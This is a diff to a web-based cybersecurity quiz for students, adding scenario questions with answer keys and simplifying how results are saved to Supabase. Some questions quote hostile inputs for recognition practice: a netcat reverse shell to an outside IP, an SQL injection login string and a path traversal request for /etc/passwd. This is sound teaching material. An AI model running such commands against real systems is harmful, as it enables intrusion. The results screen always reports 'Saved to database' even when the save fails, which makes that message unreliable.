-                            "T!m9#qL2@z"
-                        ],
-                        a: 3
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Easy",
-                        skill: "Access Control",
-                        q: "What does least privilege mean?",
-                        o: [
-                            "Give everyone admin access",
-                            "Give a user only the access they need",
-                            "Remove all passwords",
-                            "Allow everyone to access all files"
-                        ],
-                        a: 1
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "Brute Force",
-                        q: "You see many failed login attempts on one account in a short time. What could this mean?",
-                        o: [
-                            "A possible brute-force attack",
-                            "A normal file download",
-                            "A DNS problem",
-                            "A screen problem"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Medium",
-                        skill: "IOC",
-                        q: "What does IOC mean in cybersecurity?",
-                        o: [
-                            "Internet Online Connection",
-                            "Input Output Command",
-                            "Indicator of Compromise",
-                            "Internal Operating Computer"
-                        ],
-                        a: 2
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "Threat Analysis",
-                        q: "You find a suspicious file on a computer. What is a good first step?",
-                        o: [
-                            "Open the file",
-                            "Share the file with everyone",
-                            "Delete all logs",
-                            "Check the file and investigate it safely"
-                        ],
-                        a: 3
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Medium",
-                        skill: "Vulnerabilities",
-                        q: "What is a vulnerability?",
-                        o: [
-                            "A weakness that attackers can use",
-                            "A strong password",
-                            "An antivirus program",
-                            "A backup"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "Incident Response",
-                        q: "A computer is infected and is connecting to a strange server. What should you consider doing?",
-                        o: [
-                            "Ignore it",
-                            "Share the user's password",
-                            "Isolate the computer and investigate",
-                            "Delete the security logs"
-                        ],
-                        a: 2
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Medium",
-                        skill: "Encryption",
-                        q: "Why is encryption used?",
-                        o: [
-                            "To make the CPU faster",
-                            "To protect data from people who should not read it",
-                            "To increase disk space",
-                            "To remove malware"
-                        ],
-                        a: 1
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "Web Security",
-                        q: "A website puts user input directly into an SQL query. What attack should you check for?",
-                        o: [
-                            "SQL Injection",
-                            "DDoS only",
-                            "DNS failure",
-                            "ARP failure"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "Security Analysis",
-                        q: "A strange program starts from a temporary folder and connects to an unknown server. What should you do?",
-                        o: [
-                            "Assume it is safe",
-                            "Ignore it",
-                            "Investigate the process and network connection",
-                            "Turn off the monitor"
-                        ],
-                        a: 2
-                    }
-
+                    // 7 Practical Questions
+                    { type: "Practical", level: "Easy", skill: "Threat Detection", q: "Scenario: You inspect server logs and notice 500 failed login attempts in 10 seconds for user 'root'. What attack is occurring?", o: ["Brute-Force Attack", "SQL Injection", "Cross-Site Scripting (XSS)", "Man-in-the-Middle"], a: 0 },
+                    { type: "Practical", level: "Easy", skill: "Web Defense", q: "Scenario: An input box in a web form accepts 'admin' OR '1'='1' and logs you in without password. What vulnerability exists?", o: ["SQL Injection (SQLi)", "Path Traversal", "CSRF Attack", "Buffer Overflow"], a: 0 },
+                    { type: "Practical", level: "Easy", skill: "Secure SSH", q: "Scenario: To secure SSH access, which line should be configured in '/etc/ssh/sshd_config'?", o: ["PermitRootLogin no", "PasswordAuthentication yes", "Port 80", "AllowEmptyPasswords yes"], a: 0 },
+                    { type: "Practical", level: "Medium", skill: "Reverse Shell Detection", q: "Scenario: Process inspection shows 'nc -e /bin/bash 45.33.32.156 4444' active in background. What is this?", o: ["An active Reverse Shell back to attacker", "Normal Linux system update", "DNS domain query", "Encrypted HTTPS connection"], a: 0 },
+                    { type: "Practical", level: "Medium", skill: "Path Traversal", q: "Scenario: An attacker sends 'GET /view.php?file=../../../../etc/passwd'. What attack is being attempted?", o: ["Directory / Path Traversal Attack", "Command Injection", "Server-Side Template Injection", "XSS Session Hijacking"], a: 0 },
+                    { type: "Practical", level: "Medium", skill: "Firewall Rule (UFW)", q: "Scenario: Which command blocks all incoming network traffic from IP '198.51.100.44' in Linux UFW?", o: ["ufw deny from 198.51.100.44", "ufw allow 198.51.100.44", "iptables -A INPUT -j ACCEPT", "ping -block 198.51.100.44"], a: 0 },
+                    { type: "Practical", level: "Medium", skill: "Wireshark Packet Analysis", q: "Scenario: You filter Wireshark by 'http.request.method == \"POST\"'. What are you trying to analyze?", o: ["Submitted web form data (credentials, uploads)", "DNS domain queries", "Encrypted TLS handshakes", "Ping ICMP ECHO requests"], a: 0 }
                 ]
             }
-
         ];
-
-
-        /* =========================================================
-           VARIABLES
-           ========================================================= */
 
         let currentStage = 0;
         let currentQuestion = 0;
-
-        let answers = [];
-
-        let startTime = null;
-
-        let stageStartTime = null;
-
-        let resultData = null;
-
+        let answers = stages.map(s => Array(s.questions.length).fill(null));
         let studentId = null;
-
-        let savedStages = [];
-
-
-        /* =========================================================
-           SUPABASE REQUEST
-           ========================================================= */
+        let singleSectionMode = false;
 
         async function supabaseRequest(table, method, body = null) {
-
-            const url =
-                `${SUPABASE_URL}/rest/v1/${table}`;
-
+            const url = `${SUPABASE_URL}/rest/v1/${table}`;
             const options = {
-
                 method: method,
-
                 headers: {
                     "apikey": SUPABASE_KEY,
                     "Authorization": `Bearer ${SUPABASE_KEY}`,
                     "Content-Type": "application/json",
                     "Prefer": "return=representation"
                 }
-
             };
-
-            if (body !== null) {
-                options.body = JSON.stringify(body);
-            }
-
-            const response = await fetch(url, options);
-
-            const text = await response.text();
-
-            let data;
-
+            if (body) options.body = JSON.stringify(body);
             try {
-                data = text ? JSON.parse(text) : null;
-            } catch {
-                data = text;
-            }
-
-            if (!response.ok) {
-
-                console.error(
-                    "Supabase Error:",
-                    response.status,
-                    data
-                );
-
-                throw new Error(
-                    `Supabase error ${response.status}: ${typeof data === "string" ? data : JSON.stringify(data)}`
-                );
-            }
-
-            return data;
+                const res = await fetch(url, options);
+                return res.ok ? await res.json() : null;
+            } catch (e) { return null; }
         }
 
-
-        /* =========================================================
-           SAVE STUDENT
-           ========================================================= */
-
-        async function createStudent(name) {
-
-            try {
-
-                const data = await supabaseRequest(
-                    "cyber_students",
-                    "POST",
-                    {
-                        name: name,
-                        major: major
-
-                    }
-                );
-
-                if (!data || !data.length || !data[0].id) {
-                    throw new Error("Student ID was not returned.");
-                }
-
-                studentId = data[0].id;
-
-                console.log(
-                    "Student saved successfully. ID:",
-                    studentId
-                );
-
-                return true;
-
-            } catch (error) {
-
-                console.error(
-                    "Could not save student:",
-                    error
-                );
-
-                alert(
-                    "Could not connect to the database.\n\n" +
-                    "Please check your Supabase settings and try again."
-                );
-
-                return false;
-            }
+        function startTestWithStage(stageIdx) {
+            document.getElementById("sectionSelect").value = stageIdx;
+            startTest();
         }
-
-
-        /* =========================================================
-           START TEST
-           ========================================================= */
 
         async function startTest() {
-
-            const name =
-                document.getElementById("name").value.trim();
-
-            const major =
-                document.getElementById("major").value;
-
+            const name = document.getElementById("name").value.trim();
+            const major = document.getElementById("major").value;
+            const selStage = document.getElementById("sectionSelect").value;
 
             if (!name || !major) {
-
-                document.getElementById(
-                    "startError"
-                ).style.display = "block";
-
+                document.getElementById("startError").style.display = "block";
                 return;
             }
+            document.getElementById("startError").style.display = "none";
 
-
-            document.getElementById(
-                "startError"
-            ).style.display = "none";
-
-
-            /*
-               Save student BEFORE starting the assessment.
-            */
-
-            const saved =
-                await createStudent(name);
-
-
-            if (!saved) {
-                return;
+            if (!studentId) {
+                const res = await supabaseRequest("cyber_students", "POST", { name, major });
+                if (res && res[0]) studentId = res[0].id;
             }
 
+            if (selStage === "ALL") {
+                singleSectionMode = false;
+                currentStage = 0;
+            } else {
+                singleSectionMode = true;
+                currentStage = parseInt(selStage);
+            }
 
-            /*
-               Reset assessment.
-            */
-
-            answers =
-                stages.map(
-                    s => Array(s.questions.length).fill(null)
-                );
-
-            savedStages =
-                stages.map(() => false);
-
-
-            currentStage = 0;
             currentQuestion = 0;
-
-            startTime = Date.now();
-
-            stageStartTime = Date.now();
-
-
-            document.getElementById(
-                "startSuccess"
-            ).style.display = "block";
-
-
-            setTimeout(() => {
-
-                document.getElementById(
-                    "start"
-                ).classList.add("hidden");
-
-                document.getElementById(
-                    "quiz"
-                ).classList.remove("hidden");
-
-                renderQuestion();
-
-            }, 500);
+            document.getElementById("start").classList.add("hidden");
+            document.getElementById("quiz").classList.remove("hidden");
+            renderQuestion();
         }
-
-
-        /* =========================================================
-           RENDER QUESTION
-           ========================================================= */
 
         function renderQuestion() {
+            const stage = stages[currentStage];
+            const item = stage.questions[currentQuestion];
 
-            const stage =
-                stages[currentStage];
+            document.getElementById("stageLabel").textContent = `Section: ${stage.name}`;
+            document.getElementById("qCounter").textContent = `Question ${currentQuestion + 1} / ${stage.questions.length}`;
+            document.getElementById("progressBar").style.width = `${((currentQuestion + 1) / stage.questions.length) * 100}%`;
+            document.getElementById("typeBadge").textContent = `${item.type} · Level: ${item.level} · Skill: ${item.skill}`;
+            document.getElementById("questionText").textContent = item.q;
 
-            const item =
-                stage.questions[currentQuestion];
-
-
-            document.getElementById(
-                "stageLabel"
-            ).textContent =
-                `Stage ${currentStage + 1}: ${stage.name}`;
-
-
-            document.getElementById(
-                "qCounter"
-            ).textContent =
-                `Question ${currentQuestion + 1} / ${stage.questions.length}`;
-
-
-            document.getElementById(
-                "progressBar"
-            ).style.width =
-                `${((currentQuestion + 1) / stage.questions.length) * 100}%`;
-
-
-            document.getElementById(
-                "typeBadge"
-            ).textContent =
-                `${item.type} · ${item.level} · ${item.skill}`;
-
-
-            document.getElementById(
-                "questionText"
-            ).textContent =
-                item.q;
-
-
-            const box =
-                document.getElementById("options");
-
-
+            const box = document.getElementById("options");
             box.innerHTML = "";
 
-
             item.o.forEach((opt, i) => {
-
-                const label =
-                    document.createElement("label");
-
+                const label = document.createElement("label");
                 label.className = "option";
-
-
-                label.innerHTML = `
-                <input
-                    type="radio"
-                    name="answer"
-                    value="${i}"
-                    ${answers[currentStage][currentQuestion] === i ? "checked" : ""}
-                >
-                ${opt}
-            `;
-
-
-                label
-                    .querySelector("input")
-                    .addEventListener(
-                        "change",
-                        e => {
-
-                            answers[currentStage][currentQuestion] =
-                                Number(e.target.value);
-
-                        }
-                    );
-
-
+                label.innerHTML = `<input type="radio" name="ans" value="${i}" ${answers[currentStage][currentQuestion] === i ? "checked" : ""}> ${opt}`;
+                label.querySelector("input").addEventListener("change", e => {
+                    answers[currentStage][currentQuestion] = Number(e.target.value);
+                });
                 box.appendChild(label);
-
             });
 
-
-            document.getElementById(
-                "backBtn"
-            ).disabled =
-                currentStage === 0 &&
-                currentQuestion === 0;
-
-
-            document.getElementById(
-                "nextBtn"
-            ).textContent =
-                (
-                    currentStage === stages.length - 1 &&
-                    currentQuestion === stage.questions.length - 1
-                )
-                    ? "Finish"
-                    : "Next";
-
-
-            document.getElementById(
-                "saveStatus"
-            ).innerHTML = "";
-
+            document.getElementById("backBtn").disabled = (currentQuestion === 0);
+            document.getElementById("nextBtn").textContent = (currentQuestion === stage.questions.length - 1) ? "Finish Section" : "Next";
         }
-
-
-        /* =========================================================
-           BUILD ANSWERS FOR DATABASE
-           ========================================================= */
-
-        function buildDetailedAnswers(stageIndex) {
-
-            const stage =
-                stages[stageIndex];
-
-            const stageAnswers =
-                answers[stageIndex];
-
-
-            return stage.questions.map((q, i) => {
-
-                const selectedIndex =
-                    stageAnswers[i];
-
-
-                return {
-
-                    questionNumber: i + 1,
-
-                    question: q.q,
-
-                    type: q.type,
-
-                    level: q.level,
-
-                    skill: q.skill,
-
-                    options: q.o,
-
-                    selectedAnswerIndex:
-                        selectedIndex,
-
-                    selectedAnswer:
-                        selectedIndex !== null
-                            ? q.o[selectedIndex]
-                            : null,
-
-                    correctAnswerIndex:
-                        q.a,
-
-                    correctAnswer:
-                        q.o[q.a],
-
-                    isCorrect:
-                        selectedIndex === q.a
-
-                };
-
-            });
-
-        }
-
-
-        /* =========================================================
-           SCORE STAGE
-           ========================================================= */
-
-        function scoreStage(stageIndex) {
-
-            const s =
-                stages[stageIndex];
-
-            const ans =
-                answers[stageIndex];
-
-
-            let correct = 0;
-
-            let theory = 0;
-
-            let practical = 0;
-
-            let theoryTotal = 0;
-
-            let practicalTotal = 0;
-
-
-            s.questions.forEach((q, i) => {
-
-                if (q.type === "Theory") {
-
-                    theoryTotal++;
-
-                } else {
-
-                    practicalTotal++;
-
-                }
-
-
-                if (ans[i] === q.a) {
-
-                    correct++;
-
-
-                    if (q.type === "Theory") {
-
-                        theory++;
-
-                    } else {
-
-                        practical++;
-
-                    }
-
-                }
-
-            });
-
-
-            const skillStats = {};
-
-
-            s.questions.forEach((q, i) => {
-
-                if (!skillStats[q.skill]) {
-
-                    skillStats[q.skill] = {
-                        correct: 0,
-                        total: 0
-                    };
-
-                }
-
-
-                skillStats[q.skill].total++;
-
-
-                if (ans[i] === q.a) {
-
-                    skillStats[q.skill].correct++;
-
-                }
-
-            });
-
-
-            return {
-
-                correct,
-
-                total: s.questions.length,
-
-                percent:
-                    Math.round(
-                        correct / s.questions.length * 100
-                    ),
-
-                theory,
-
-                practical,
-
-                theoryTotal,
-
-                practicalTotal,
-
-                skillStats
-
-            };
-
-        }
-
-
-        /* =========================================================
-           SAVE ONE STAGE TO SUPABASE
-           ========================================================= */
-
-        async function saveStageResult(stageIndex, elapsedSeconds) {
-
-            if (savedStages[stageIndex]) {
-
-                console.log(
-                    "Stage already saved:",
-                    stages[stageIndex].name
-                );
-
-                return true;
-            }
-
-
-            const stage =
-                stages[stageIndex];
-
-
-            const score =
-                scoreStage(stageIndex);
-
-
-            const detailedAnswers =
-                buildDetailedAnswers(stageIndex);
-
-
-            const result = {
-
-                student_id: studentId,
-
-                section: stage.name,
-
-                score: score.correct,
-
-                total_questions: score.total,
-
-                correct_answers: score.correct,
-
-                wrong_answers:
-                    score.total - score.correct,
-
-                percentage: score.percent,
-
-                time_seconds: elapsedSeconds,
-
-                answers: {
-
-                    student_name:
-                        document.getElementById("name").value.trim(),
-
-                    major:
-                        document.getElementById("major").value,
-
-                    section:
-                        stage.name,
-
-                    section_score:
-                        score.correct,
-
-                    section_total:
-                        score.total,
-
-                    section_percentage:
-                        score.percent,
-
-                    theory_correct:
-                        score.theory,
-
-                    theory_total:
-                        score.theoryTotal,
-
-                    practical_correct:
-                        score.practical,
-
-                    practical_total:
-                        score.practicalTotal,
-
-                    skill_breakdown:
-                        score.skillStats,
-
-                    questions:
-                        detailedAnswers
-
-                }
-
-            };
-
-
-            try {
-
-                document.getElementById(
-                    "saveStatus"
-                ).innerHTML =
-                    `<div class="saving">Saving ${stage.name} result...</div>`;
-
-
-                await supabaseRequest(
-                    "cyber_results",
-                    "POST",
-                    result
-                );
-
-
-                savedStages[stageIndex] = true;
-
-
-                document.getElementById(
-                    "saveStatus"
-                ).innerHTML =
-                    `<div class="saved">✓ ${stage.name} result saved successfully.</div>`;
-
-
-                console.log(
-                    `${stage.name} saved successfully`
-                );
-
-
-                return true;
-
-
-            } catch (error) {
-
-                console.error(
-                    `Failed to save ${stage.name}:`,
-                    error
-                );
-
-
-                document.getElementById(
-                    "saveStatus"
-                ).innerHTML =
-                    `<div class="error" style="display:block">
-                    Could not save ${stage.name} result.
-                    Please try again.
-                </div>`;
-
-
-                alert(
-                    `Could not save ${stage.name} result to the database.\n\n` +
-                    "Please check your internet connection and try again."
-                );
-
-
-                return false;
-
-            }
-
-        }
-
-
-        /* =========================================================
-           NEXT QUESTION
-           ========================================================= */
 
         async function nextQuestion() {
-
-            if (
-                answers[currentStage][currentQuestion] === null
-            ) {
-
-                alert(
-                    "Please choose an answer before continuing."
-                );
-
+            if (answers[currentStage][currentQuestion] === null) {
+                alert("Please select an answer first.");
                 return;
             }
 
-
-            /*
-               Normal question.
-            */
-
-            if (
-                currentQuestion <
-                stages[currentStage].questions.length - 1
-            ) {
-
+            if (currentQuestion < stages[currentStage].questions.length - 1) {
                 currentQuestion++;
-
                 renderQuestion();
-
                 return;
             }
 
+            // Save Result on completing the section
+            await saveCurrentStageResult();
 
-            /*
-               Last question of current stage.
-               Calculate section time.
-            */
-
-            const stageElapsedSeconds =
-                Math.round(
-                    (Date.now() - stageStartTime) / 1000
-                );
-
-
-            /*
-               Save this stage before moving forward.
-            */
-
-            const saved =
-                await saveStageResult(
-                    currentStage,
-                    stageElapsedSeconds
-                );
-
-
-            if (!saved) {
-
-                return;
-
-            }
-
-
-            /*
-               Move to next stage.
-            */
-
-            if (
-                currentStage <
-                stages.length - 1
-            ) {
-
+            if (!singleSectionMode && currentStage < stages.length - 1) {
                 currentStage++;
-
                 currentQuestion = 0;
-
-                stageStartTime = Date.now();
-
                 renderQuestion();
-
-                return;
+            } else {
+                showResults();
             }
-
-
-            /*
-               Last stage completed.
-               Finish complete assessment.
-            */
-
-            finishTest();
-
         }
-
-
-        /* =========================================================
-           PREVIOUS QUESTION
-           ========================================================= */
 
         function previousQuestion() {
-
             if (currentQuestion > 0) {
-
                 currentQuestion--;
-
                 renderQuestion();
-
-                return;
             }
-
-
-            if (currentStage > 0) {
-
-                currentStage--;
-
-                currentQuestion =
-                    stages[currentStage].questions.length - 1;
-
-                renderQuestion();
-
-            }
-
         }
 
+        async function saveCurrentStageResult() {
+            const stage = stages[currentStage];
+            const ans = answers[currentStage];
+            let correct = 0;
+            ans.forEach((a, i) => { if (a === stage.questions[i].a) correct++; });
 
-        /* =========================================================
-           FINISH TEST
-           ========================================================= */
-
-        function finishTest() {
-
-            const scores =
-                stages.map(
-                    (_, i) => scoreStage(i)
-                );
-
-
-            const total =
-                scores.reduce(
-                    (x, s) => x + s.correct,
-                    0
-                );
-
-
-            const totalQ =
-                stages.reduce(
-                    (x, s) => x + s.questions.length,
-                    0
-                );
-
-
-            const elapsedSeconds =
-                Math.round(
-                    (Date.now() - startTime) / 1000
-                );
-
-
-            let level;
-
-
-            if (
-                total / totalQ >= .80
-            ) {
-
-                level =
-                    "Advanced Foundation";
-
-            } else if (
-                total / totalQ >= .65
-            ) {
-
-                level =
-                    "Intermediate";
-
-            } else if (
-                total / totalQ >= .45
-            ) {
-
-                level =
-                    "Beginner";
-
-            } else {
-
-                level =
-                    "Needs Foundation";
-
-            }
-
-
-            resultData = {
-
-                studentId: studentId,
-
-                name:
-                    document.getElementById(
-                        "name"
-                    ).value.trim(),
-
-                major:
-                    document.getElementById(
-                        "major"
-                    ).value,
-
-                completedAt:
-                    new Date().toISOString(),
-
-                elapsedSeconds,
-
-                totalScore:
-                    total,
-
-                totalQuestions:
-                    totalQ,
-
-                overallPercent:
-                    Math.round(
-                        total / totalQ * 100
-                    ),
-
-                overallLevel:
-                    level,
-
-                stages:
-                    scores.map((s, i) => ({
-
-                        skill:
-                            stages[i].name,
-
-                        score:
-                            s.correct,
-
-                        maxScore:
-                            s.total,
-
-                        percent:
-                            s.percent,
-
-                        theoryCorrect:
-                            s.theory,
-
-                        theoryTotal:
-                            s.theoryTotal,
-
-                        practicalCorrect:
-                            s.practical,
-
-                        practicalTotal:
-                            s.practicalTotal,
-
-                        skillBreakdown:
-                            s.skillStats
-
-                    }))
-
+            const payload = {
+                student_id: studentId,
+                section: stage.name,
+                score: correct,
+                total_questions: stage.questions.length,
+                correct_answers: correct,
+                wrong_answers: stage.questions.length - correct,
+                percentage: Math.round((correct / stage.questions.length) * 100)
             };
 
+            await supabaseRequest("cyber_results", "POST", payload);
 
-            localStorage.setItem(
-                "cyberAssessmentLastResult",
-                JSON.stringify(resultData)
-            );
-
-
-            document.getElementById(
-                "quiz"
-            ).classList.add("hidden");
-
-
-            document.getElementById(
-                "result"
-            ).classList.remove("hidden");
-
-
-            document.getElementById(
-                "resultTitle"
-            ).textContent =
-                `${resultData.name}, your assessment is complete.`;
-
-
-            document.getElementById(
-                "totalScore"
-            ).textContent =
-                `${total} / ${totalQ}`;
-
-
-            document.getElementById(
-                "levelText"
-            ).innerHTML =
-                `<strong>Overall Level:</strong>
-             ${level} · ${resultData.overallPercent}%`;
-
-
-            const grid =
-                document.getElementById(
-                    "resultGrid"
-                );
-
-
-            grid.innerHTML = "";
-
-
-            resultData.stages.forEach(s => {
-
-                const d =
-                    document.createElement("div");
-
-
-                d.className =
-                    "result-card";
-
-
-                d.innerHTML = `
-
-                <h3>${s.skill}</h3>
-
-                <div
-                    class="score-big"
-                    style="font-size:34px"
-                >
-                    ${s.score}/${s.maxScore}
-                </div>
-
-                <p>
-                    ${s.percent}%
-                </p>
-
-                <p class="small">
-                    Theory:
-                    ${s.theoryCorrect}/${s.theoryTotal}
-                    <br>
-
-                    Practical:
-                    ${s.practicalCorrect}/${s.practicalTotal}
-                </p>
-
-                <div
-                    class="small"
-                    style="margin-top:10px"
-                >
-                    ${Object.entries(
-                    s.skillBreakdown
-                )
-                        .map(
-                            ([k, v]) =>
-                                `${k}: ${v.correct}/${v.total}`
-                        )
-                        .join("<br>")}
-                </div>
-
-            `;
-
-
-                grid.appendChild(d);
-
-            });
-
+            const tag = document.getElementById(`tag-${currentStage}`);
+            if (tag) {
+                tag.textContent = "Completed";
+                tag.style.background = "#28a745";
+                tag.parentElement.classList.add("completed");
+            }
         }
 
+        function showResults() {
+            document.getElementById("quiz").classList.add("hidden");
+            document.getElementById("result").classList.remove("hidden");
 
-        /* =========================================================
-           DOWNLOAD RESULT
-           ========================================================= */
+            const stage = stages[currentStage];
+            const ans = answers[currentStage];
+            let correct = 0;
+            ans.forEach((a, i) => { if (a === stage.questions[i].a) correct++; });
 
-        function downloadResult() {
+            const percent = Math.round((correct / stage.questions.length) * 100);
 
-            const blob =
-                new Blob(
-                    [
-                        JSON.stringify(
-                            resultData,
-                            null,
-                            2
-                        )
-                    ],
-                    {
-                        type: "application/json"
-                    }
-                );
-
-
-            const a =
-                document.createElement("a");
-
-
-            a.href =
-                URL.createObjectURL(blob);
-
-
-            a.download =
-                `assessment-${resultData.name.replace(
-                    /\s+/g,
-                    "-"
-                )
-                }.json`;
-
-
-            a.click();
-
-
-            URL.revokeObjectURL(
-                a.href
-            );
-
+            document.getElementById("resultBox").innerHTML = `
+                    <h2>Section: ${stage.name}</h2>
+                    <p style="font-size:32px; font-weight:bold; color:var(--purple); margin:10px 0;">Score: ${correct} / ${stage.questions.length} (${percent}%)</p>
+                    <p>Status: <span style="color:var(--green)">✓ Saved to database</span></p>
+                `;
         }
 
+        function returnToDashboard() {
+            document.getElementById("result").classList.add("hidden");
+            document.getElementById("start").classList.remove("hidden");
+        }
     </script>
-
 </body>
 </html>
